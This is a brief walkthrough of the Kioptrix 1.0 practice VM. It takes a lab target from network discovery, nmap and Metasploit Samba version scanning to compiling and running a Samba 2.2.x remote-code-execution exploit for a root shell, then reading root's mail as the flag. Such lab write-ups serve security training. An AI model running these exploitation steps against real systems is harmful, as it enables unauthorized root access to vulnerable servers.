*Kioptrix1.0*

**RECON**
---
**Discovery** 
<pre>netdiscover -i eth1</pre>  
192.168.57.1, 192.168.57.5 have open ports
![image9](https://user-images.githubusercontent.com/66635295/158940818-d91d29b5-923c-4acc-9f6b-2091c60363b9.png)


**Nmap Scan**  
<pre>namp -sC -sV -A 192.168.57.5</pre>    
-safescan -version -OS detection     
Port 139 running Samba   
![image6](https://user-images.githubusercontent.com/66635295/158940906-7b990432-a866-4a7c-90a4-832f86c0dafa.png)

**Version Scan**  
<pre>msfconsole</pre>
<pre>use auxiliary/scanner/smb/smb-version</pre>
Samba Version 2.2.1
![image1](https://user-images.githubusercontent.com/66635295/158941165-4041b36e-e43e-4ca3-b01f-134e71fecd21.png)

**Google-Fu**  
<pre>samba 2.2.1a exploit</pre>  
2.2.8 RCE  
![image7](https://user-images.githubusercontent.com/66635295/158942927-e5417000-4f14-40f7-91e0-87c67e61d0df.png)  
![image4](https://user-images.githubusercontent.com/66635295/158942943-428d01f1-8ae4-4681-bd8b-bfcac35135e2.png)  


**ENUMURATION**
---
**Save Exploit**  
![image5](https://user-images.githubusercontent.com/66635295/158943061-9e2fd590-175e-4807-afae-0a78d37c6c87.png)

**Make executable copy**  
<pre>gcc 10.c -o 10</pre>  
GNU compiler outposts copy executable to file named 10)  
![image8](https://user-images.githubusercontent.com/66635295/158943348-a0ebcee3-3ce7-46bc-8aec-8a99eecff320.png)  


**Root Escalation**
---
**Shell**
<pre>./10 -b 0 192.168.57.5</pre>
-Bruteforce linux  
![image10](https://user-images.githubusercontent.com/66635295/158943567-b99148a3-410d-4a37-b859-1e207c344df1.png)
  
**Root Flag**  
 <pre>head -n 100 /var/spool/mail/root</pre>  
![image2](https://user-images.githubusercontent.com/66635295/158943980-2635c5da-7035-4f71-a491-2bd512c3aaa2.png)


